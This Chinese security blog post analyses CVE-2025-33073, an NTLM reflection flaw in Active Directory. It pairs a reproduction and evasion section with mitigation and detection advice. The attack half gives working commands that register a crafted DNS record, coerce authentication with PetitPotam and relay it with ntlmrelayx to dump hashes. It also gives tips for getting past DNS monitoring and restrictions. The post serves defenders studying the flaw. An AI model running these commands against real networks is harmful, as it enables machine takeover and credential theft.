> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484518&idx=1&sn=74adb9aeec2b4682747a29323449abb3

#  打穿AD域漏洞CVE-2025-33073的矛与盾 - 域安全  
原创 lufei  lufeisec   2025-06-25 00:00  
  
   
  
# 一、前言  
  
在上周末的时候看到有我的星球“-”大佬发了CVE-2025-33073的漏洞复现，发现漏洞利用条件比较低（仅需一个域账号）以及危害比较大（控制机器），于是着手跟进该漏洞完成缓解、 检测、修复（为了更好精准防御&监控该漏洞，我们从攻击以及防守角度进行探索）。  
  
这里文章主要探索两个核心问题：  
  
1、是否一定申请AD域内域名解析以及域名解析的实际作用是什么？（如果方案是否，应该怎么进行防御）  
  
2、1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYB的特征是否可以改变？（如果答案是否，应该怎么进行防御）  
  
期间也看了一些公众号发的文章想了解这个两个答案，可惜感觉大部分都是基本照着漏洞发现者的博客进行翻译改编（深入了解建议去看原文）。  
  
除了该域NTLM反射漏洞（CVE-2025-33073），域的安全问题以及手法挺多的，有兴趣可以查看之前的域安全的系列文章：  
  
还看！dump你的域hash来了！- 域安全：[https://mp.weixin.qq.com/s/9a9XE3CPWaZh2aMcyV5Nag](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484395&idx=1&sn=d01914b9778f2d24d3d708781e9cf403&scene=21#wechat_redirect)  
  
  
域安全-PrintNightmare打域控漏洞的一次艰难利用：[https://mp.weixin.qq.com/s/zwilhOk_9Ape4CksEKC__Q](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484304&idx=1&sn=3dec842400e5d6878c0a7032e0010a00&scene=21#wechat_redirect)  
  
# 二、矛  
## 2.1、漏洞介绍  
  
CVE-2025-33073漏洞：  
  
这是一个影响Windows系统的逻辑漏洞，允许经过身份验证的远程攻击者（普通域用户）在未强制执行SMB签名的任何机器上以SYSTEM身份执行任意命令。  
  
根本原因是Windows系统在处理NTLM和Kerberos认证时，对于本地认证的特殊处理方式。特殊的DNS记录被识别为localhost的等效形式，触发了NTLM本地认证，导致lsass.exe的SYSTEM令牌被复制并用于后续操作  
  
漏洞发现者的原文（深入剖析）：  
  
NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073：https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025  
  
微软公告：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073  
## 2.2、漏洞复现  
  
CVE-2025-33073属于漏洞利用条件比较低（仅需一个域账号）以及危害比较大（控制机器），复现也比较容易。  
  
漏洞利用逻辑：  
  
1、攻击者向域 DNS 注入一条格式特殊的记录（例如 srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA），指向其控制的 IP。该名称的前缀与目标主机名一致（如 srv1），后缀为固定填充字符  
  
2、当目标机器（如 SRV1）被诱骗连接此名称时（通过 PetitPotam 等工具触发），SMB 客户端错误地将该名称解析为本机主机名（srv1），误判为“本地身份认证请求”  
  
3、因误判为本地调用，SMB 客户端在 NTLMSSP_NEGOTIATE 消息中主动填充本机工作站名和域名（正常远程认证中该字段为空）在本地认证模式下，客户端无需计算挑战响应。相反，它直接将当前进程的 令牌（Token） 插入服务端上下文（通过 Reserved 中的 ID 传递）  
  
4、触发认证的进程是 lsass.exe（以 SYSTEM 权限运行），因此客户端插入的令牌是 SYSTEM 令牌。服务端获取该令牌后，直接模拟 SYSTEM 身份执行后续操作（如启动服务、转储 SAM 数据库）  
### 2.2.1、复现环境  

```
DC：win2008
受害机器：win2016
攻击机器：kali
```

### 2.2.2、复现命令  
  
shell_1窗口  

```
# 注册恶意dns，0day.org为域名，需要根据实际情况修改
python3 dnstool.py -u '0day.org\账户' -p '密码' -a modify -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 攻击ip 域控ip

# relay 并且进行dump hash
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t 受害机器 -smb2support

```

  
shell2_窗口  

```
# 0day.org为域名，需要根据实际情况修改
python3 PetitPotam.py -u 账户 -p '密码' -d 0day.org localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRVUZp1Ec9TXtTYsBGM4Y1ofMsQu32wMQCzOibB5shL7YGzgxru0icic3THJpqgb1ic7Zib30CETYK72eQ/640?wx_fmt=png&from=appmsg "null")  
  
  
注：localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA是通用的，只要修改该域名指向攻击机器即可，不需要修改域名。  
## 2.3、艰难利用  
### 2.3.1、安全禁止普通用户申请解析  
  
在一些AD环境中，是禁止普通用户申请域名解析的，那我们还能够进行利用吗？  
  
答案是可以的，在上面的漏洞利用逻辑中，我们发现其实通过受害机器通过域名访问恶意服务器的时候srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA就会触发漏洞，并不需要校验该域名。  
  
那只要把srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA指向攻击机器即可（因为会解析该域并且返回凭据），**所以我们的结论是：不非要在AD域内申请解析，只要能修改受害机器上srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA的解析即可。**  
  
在禁止普通用户申请AD域内解析，那我们还有如下方法进行解决：  
  
1、在有内网DNS的情况下，窃取到开发或者运维权限申请域名（具体例子：如下图个人腾讯云linux机器，它就自定义使用private dns进行注册域名）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRVUZp1Ec9TXtTYsBGM4Y1o347QFLvL0b0wm7uZzwz6iaJf00eFCicSxBkAnV6e4QOcibvqia5TGMKw4A/640?wx_fmt=png&from=appmsg "null")  
  
  
  
2、通过MitM进行mDNS、LLMNR和NetBIOS-NS执行本地域名解析欺骗  
  
3、修改机器的本地hosts文件（利用难度比较大，需要管理员权限写）  
### 2.3.2、安全监控了域名解析  
  
目前主流的监控方案是对dns监控恶意域名的解析，如果是攻击者，如何对恶意域名变形呢（即能绕过安全检测也能让漏洞继续利用）？  
  
那我们就需要了解一下1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA是如何构造的了。其实他的构造就是微软定义的CREDENTIAL_TARGET_INFORMATIONW结构，再通过CredMarshalTargetInfo进行Marshall处理一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRVUZp1Ec9TXtTYsBGM4Y1oDYMibjyQCZgpG9B3AtmJibh8VR4VWLL6cuk9XjYA7ge5Xfu6kxNMybvw/640?wx_fmt=png&from=appmsg "null")  
  
  
1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA构造其实比较简单，通过下面代码即可构造成功：  

```
CREDENTIAL_TARGET_INFORMATIONW targetInfo = { 0 };
CredMarshalTargetInfo(&targetInfo, &buffer, &bufferSize);
```

  
笔者通过不断修改上面的CREDENTIAL_TARGET_INFORMATIONW的属性，发现# 31 55 57 68 52 不会变，也即是1UWhR这个特征是固定，其他的字符串均可变。所以蓝军利用的是否可以利用这个小tip进行变形。  
# 三、盾  
  
我们了解矛，当然是为了更好的构建出盾出来。有如上的绕过手法，应该构建纵深防御体系，而非孤立防御（如只在AD上、只在DNS、只在终端）。  
## 3.1、止损方案  
### 3.1.1、禁止域名注册  
  
我们在开始搜索DNS，打开DNS Manager观察一下域名的权限，发现经过验证的用户都可以对域名创建自己对象（也就是可以注册未注册的域名），这个也是攻击的条件之一。  
  
我们只要禁止经过验证的用户注册域名就可以完成初步的止损。（当然也要考虑实际的业务影响）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRVUZp1Ec9TXtTYsBGM4Y1oXusUoRDVXhnNAf1MLnACkW4aIzicUIqibkY5xs0oADck6EYeKKsdfcbA/640?wx_fmt=png&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRVUZp1Ec9TXtTYsBGM4Y1obJB1LiaD3ZFhqiaBdWSb55zyKQquISAkQeeibZFUjmk1FwNZ9W1kpribQw/640?wx_fmt=png&from=appmsg "null")  
  
  
临时抢注域名：这个方案很不推荐，因为通过上面的case看到，有很多的绕过手法。  
### 3.1.2、开启强制签名  
  
此漏洞攻击条件其二是要求为开启smb签名，从 Windows 11 24H2 和 Windows Server 2025 开始，默认情况下，所有出站和入站 SMB 连接现在都需要签名。 以前，默认情况下，只有连接到名为 SYSVOL 和 NETLOGON 的共享以及 AD 域控制器的客户端才需要 SMB 签名。  
  
要禁用组策略中的 SMB 登录，请执行以下步骤（有影响计算开销：每个SMB数据包均需生成/验证哈希签名，增加CPU负载。尤其在频繁读写大文件（如数据库、视频编辑）时，传输速率可能下降10%-20%，不一定准确）：  
  
1、选择开始，键入 gpedit.msc，然后按 Enter。  
  
2、在本地组策略编辑器中，导航到 Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options。  
  
3、打开 Microsoft 网络服务器：对通信进行数字签名（始终），选择已启用，然后选择确定  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRVUZp1Ec9TXtTYsBGM4Y1ogdkGcz5Yu1ko04y5Y5qibaiciasRU9BwwBYf6qOOzhlsH2bicGfl4pw71w/640?wx_fmt=png&from=appmsg "null")  
  
  
参考文档：https://learn.microsoft.com/zh-cn/windows-server/storage/file-server/smb-signing?tabs=group-policy  
### 3.1.3、打补丁  
  
打补丁是一个官方的修复方案（一劳永逸），但是实际经常打补丁的同学都知道，会遇到各种老旧机器无法打补丁。  
  
有些机器也不支持打补丁，具体请看：  
  
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073  
  
如果打补丁不行的话，只能推荐上面两种方案。  
## 3.2、检测方案  
  
检测起来还是比较复杂的，建议在DNS（包括内部DNS）、终端等多种手段进行检测。  
### 3.2.1、终端检测  
  
这里获取的是凭据，如果我们要获取机器权限，最后还是得通过得通过横向移动的手法去获取机器权限。  
  
比如常见的PsExec、wmiexec、dcom等等。这里我们那psexec举例其实CreateService创建一个服务然后启动该服务（检测异常服务以及进程链入手）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRVUZp1Ec9TXtTYsBGM4Y1oicBibW4USQpibukibvMam3zU71wcibXBeVqLDVoDBPUBelIcNPJmcSurREA/640?wx_fmt=png&from=appmsg "null")  
  
### 3.2.2、dns检测  
  
dns检测是一个好办法，但是需要注意的是要收集所有的dns记录（如内网的DNS、AD的DNS等等），  
### 3.2.3、AD日志  
  
目前从默认的AD日志来看的话，只有注册dns以及发起PetitPotam请求是所进行的身份校验日志（无强特征），所以这里并不好做检测。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRVUZp1Ec9TXtTYsBGM4Y1oo321YxB3VJuRkAMFglkKic6gLueSLicOlTTyicbpzM9ibZxZkNfvu4Xdpg/640?wx_fmt=png&from=appmsg "null")  
  
### 3.2.4、流量检测  
  
流量检测目前看起来不是很实现，因为不仅仅涉及到南北，而且涉及东西流量，没有好办法完全覆盖，所以暂时没去分析研究（不过可以尝试监控PetitPotam：efsrpcopenfileraw、printbug：RpcRemoteFindFirstPrinterChangeNotificationEx的rpc流量以及函数调用）  
# 四、总结  
  
文章介绍了最近公开的windows域大杀器CVE-2025-33073漏洞，并且从攻击和防御两个角度去探索该漏洞，以及探索了一些新的姿势。  
  
   
  
  
云安全系列  
  
[云安全 - k8s ingress漏洞进一步探索引发的源码层面的文件漏洞利用特性分析（golang、java、php）](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484504&idx=1&sn=6c16443c92cec6973ef0c0f791bfa673&scene=21#wechat_redirect)  
  
  
[云对象存储桶写漏洞？模型和数据被投毒、机器沦陷？- AI & 云安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484486&idx=1&sn=b703890fc5173946b326edd3474a6515&scene=21#wechat_redirect)  
  
  
[你的k8s集群又被拿下了？IngressNightmare - 云安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484462&idx=1&sn=002c1dbfb0b80b864ced504d495ee5b3&scene=21#wechat_redirect)  
  
  
[21年挖的对象存储漏洞到现在结束了吗？- 云安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484412&idx=1&sn=a5e2f663197fdd2fda9f5c1e854866a3&scene=21#wechat_redirect)  
  
  
  
域安全  
  
[还看！dump你的域hash来了！-  域安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484395&idx=1&sn=d01914b9778f2d24d3d708781e9cf403&scene=21#wechat_redirect)  
  
  
[域安全-PrintNightmare打域控漏洞的一次艰难利用](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484304&idx=1&sn=3dec842400e5d6878c0a7032e0010a00&scene=21#wechat_redirect)  
  
  
  
AI安全&应用  
  
[加载数据集或模型可能就中毒！大模型供应链安全](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484075&idx=1&sn=a71cb46d562c054d628237d8623eeffa&chksm=fc2ff974cb5870628fad87f92a33c69c89e230b9a655ee844b2b7c19a8bbde0d3ed7d5cc7ecb&scene=21#wechat_redirect)  
  
  
[AI与基础安全结合的新的攻击面](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483958&idx=1&sn=156f308fcc6bd33c7de1080767344c66&chksm=fc2ff9e9cb5870ff98fb357f5c39d85146fd751eeae3eb1b7cd5f299a949f681d89bf00d4eb7&scene=21#wechat_redirect)  
  
  
[AI落地-蓝军之默认密码获取](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483819&idx=1&sn=6d672766eac01164b4846f6deedba511&chksm=fc2ffa74cb587362e450814ddfa606138c9476c283353c880d9df8416c9da99e1bb1eb637073&scene=21#wechat_redirect)  
  
  
  
甲方安全系列  
  
[威胁狩猎第一步](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484366&idx=1&sn=56b2eb9d4e28c3d5aee18f072f96913b&scene=21#wechat_redirect)  
  
  
[如何单机实时分析日均数亿安全日志？](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484354&idx=1&sn=3c566e1304f8bf5615bafdb0c866f80b&scene=21#wechat_redirect)  
  
  
[三条命令查杀冰蝎、哥斯拉内存马](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484297&idx=1&sn=60ce5e45397c49b22312309e01304364&chksm=fc2ff856cb5871408b47f4daa239c852e36b4076d1add645d42ceebc18637b90f250d255a4be&scene=21#wechat_redirect)  
  
  
[最近CDN供应链事件的曲折分析与应对-业务安全](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484103&idx=1&sn=7092b50b647334ceda6cc3b6f11c91ea&chksm=fc2ff918cb58700eb25f7e9af09c0ee484aa1ae821666c3a201600e878425ec53e6ab6242c2e&scene=21#wechat_redirect)  
  
  
[BootCDN供应链攻击分析与应对](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483780&idx=1&sn=1f563fbf7f06a3c2df9ac0be96e09502&chksm=fc2ffa5bcb58734d4eccd871e2f6e661b0b4b6e8890d6aacc8702266a86ed427e72d75eca45b&scene=21#wechat_redirect)  
  
  
  
红蓝演习  
  
[java内存马深度利用：窃取明文、钓鱼](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484205&idx=1&sn=7e9b1d48dddb607e604d788bd2557dec&chksm=fc2ff8f2cb5871e422c9da9b342da3e96966590f1fc22693e5b32d496d049321464deca973d7&scene=21#wechat_redirect)  
  
  
[“VT全绿”-手动patch exe免杀](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484180&idx=1&sn=a454e67c8629b8254da900a5c5900a2e&chksm=fc2ff8cbcb5871ddda5f129f5162a46f274afa2968eb242525461acabce72fd69ff214ce11d0&scene=21#wechat_redirect)  
  
  
[挖洞技巧-扩展攻击面](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483741&idx=1&sn=9352a348d8e18a5429c3236e6435c838&chksm=fc2ffa82cb587394e1637cda7389f8cc3d367f9f3a5565f9b8a522d67046a3158a409a9bbfaf&scene=21#wechat_redirect)  
  
  
[weblogic-2019-2725exp回显构造](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483670&idx=1&sn=baa3c2494ac61672543b32d254d0999c&chksm=fc2ffac9cb5873df1720b0a6882129f80d24614b4ec5d676bf10b5e62e09f896833e84a78c41&scene=21#wechat_redirect)  
  
  
[WEB越权-劝你多删参数值](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483676&idx=1&sn=a43204f1c18d1187f7faed1792b62ceb&chksm=fc2ffac3cb5873d50eeb0bf6e87b029ed75ff5c324c708511aceb862240cfc4f4336aa63a67a&scene=21#wechat_redirect)  
  
  
[云安全 - k8s ingress漏洞进一步探索引发的源码层面的文件漏洞利用特性分析（golang、java、php）](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484504&idx=1&sn=6c16443c92cec6973ef0c0f791bfa673&scene=21#wechat_redirect)  
  
  
  
